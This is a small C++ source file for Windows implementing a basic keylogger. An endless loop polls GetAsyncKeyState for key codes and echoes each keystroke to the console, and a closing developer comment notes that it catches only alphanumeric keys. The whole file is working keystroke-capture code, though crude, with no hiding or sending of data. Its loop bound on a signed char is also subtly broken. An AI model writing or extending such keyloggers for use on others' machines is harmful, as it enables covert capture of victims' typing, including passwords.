#include <iostream>
#include <windows.h>
#include <winuser.h>

using namespace std;

void startLogging();

int main() {
    startLogging();
}

void startLogging() {
    while(true){
        for(char c=0; c<=254 ; c++) {
            if(GetAsyncKeyState(c) & 0x1) { //comparing last bit from both using AND
                cout<<c;
            }
        }
    }
}
//Dev note: logging works correctly but only for windows system,
//  can detect alpha-numeric keys only, displays alpha keystrokes in uppercase regardless